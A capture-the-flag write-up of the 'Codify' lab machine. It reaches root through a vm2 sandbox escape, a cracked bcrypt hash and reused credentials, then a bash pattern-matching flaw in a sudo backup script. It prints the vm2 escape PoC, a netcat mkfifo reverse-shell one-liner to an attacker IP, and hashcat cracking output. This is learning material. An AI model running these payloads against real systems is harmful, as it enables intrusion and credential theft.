# Codify

## Enumeration
An initial port scan showed three open ports, SSH and two HTTP ports. with Port 80 being an Apache reverse proxy to the Node.js server running on port 3000.

## Foothold
After some initial enumeration of the website, which allows testing of Node.js code, it was discovered, that the vm2 library version 3.9.16 is used for the sandboxing of the untrusted JavaScript code. This version is vulnerable to a sandbox escape through raising an unsanitized host exception. [Snyk][vm2-vuln] published the PoC shown below, which allows exection of the `cat /etc/passwd` command on the host machine.

```
const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("cat /etc/passwd").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
}
```

Using the above vulnerability it was possible to start a reverse shell by executing netcat on the host and a listener on the attacker.
```
$ nc -lvp 4446
Listening on 0.0.0.0 4446
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.49 4446 >/tmp/f
```

The user, which runs the Node.js server was svc, which did not have access to any user flags.
```
$ whoami
svc
```

After some further digging on the server, a contact website was found, which was not published on the server. The folder contained a `tickets.db` file, which is an sqlite database file.
```
$ ls /var/www
contact
editor
html
```
```
$ ls -l /var/www/contact
total 112
-rw-rw-r-- 1 svc svc  4377 Apr 19  2023 index.js
-rw-rw-r-- 1 svc svc   268 Apr 19  2023 package.json
-rw-rw-r-- 1 svc svc 77131 Apr 19  2023 package-lock.json
drwxrwxr-x 2 svc svc  4096 Apr 21  2023 templates
-rw-r--r-- 1 svc svc 20480 Sep 12 17:45 tickets.db
```

The database could be opened using the sqlite3 CLI. Checking the tables showed a user table, which contained the password hash for a joshua user. This joshua user was also found on the machine itself.
```
$ sqlite3 tickets.db
.tables
tickets  users  
```
```
select * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

The hash could be cracked using an offline bruteforce attack with the tool hashcat.
```
$ hashcat -m 3200 -a 0 hashes /usr/share/wordlists/rockyou.txt --show
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2 spongebob1
```

The credentials turned out to be reused on the host, proven by a successful SSH login as joshua. This led to access to the user flag.

```
joshua@codify:~$ cat user.txt 
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

## Privilege Escalation
Running the `sudo -l` command, showed that joshua is allowed to run the script `/opt/scripts/mysql-backup.sh` using sudo.
```
joshua@codify:~$ sudo -l
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
cont
```
The script is used to backup a database. It loads the root credentials from a secured file, validates the credentials with a user input and backs up a mysql server to a secured directory. Using joshuas credentials it was possible to log into the mysql server, read the user table and extract the root user password hash. This hash was however not possible to be cracked using a bruteforce attack.
```
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh 
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

```

The script uses `[[ $DB_PASS == $USER_PASS ]]` to compare the user input with the correct password. This is bad, because it does pattern matching instead of actually comparing two strings with each other. This means that the wildcard character `*` produces `True` in the comparison, since it matches everything. With this knowledge a script was written, which bruteforces the password one character at the time. The script uses the currently known part of the password, appends a new character and `*` to it and checks if the comparison returns `True`. If yes the character gets appended permanently, if no a new character is tried. After a few seconds, this revealed the root password.

# Reflection
The initial foothold into the machine was rather easy, as the vm2 package and its version was linked on the website itself and the exploit was only one google search away. I spent a long time, trying to bruteforce the root password hash, which didn't work out. This just showed me, that being able to bruteforce passwords is an option, however often times probably won't work out. I learned something new about how to do or not to comparisons in bash, which is nice.
